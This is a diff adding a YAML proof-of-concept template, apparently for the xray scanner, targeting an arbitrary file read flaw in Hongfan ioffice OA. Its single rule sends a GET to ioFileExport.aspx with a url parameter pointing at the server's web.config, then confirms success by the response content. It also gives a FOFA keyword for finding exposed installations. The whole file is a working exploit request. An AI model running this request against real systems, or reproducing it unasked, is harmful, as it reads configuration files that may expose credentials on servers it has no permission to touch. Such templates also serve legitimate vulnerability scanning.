@@ -1,0 +1,17 @@
+name: poc-yaml-hongfan-oa-any-filedread
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream
+        expression: response.status == 200 && response.body.bcontains(b"PublicKeyToken=")
+expression: r0()
+detail:
+    author: cysec
+    links:
+        - http://cysec.com
+    fofakeyword: app="红帆-ioffice"
+    vulninfo: 红帆OA ioFileExport.aspx 任意文件读取漏洞
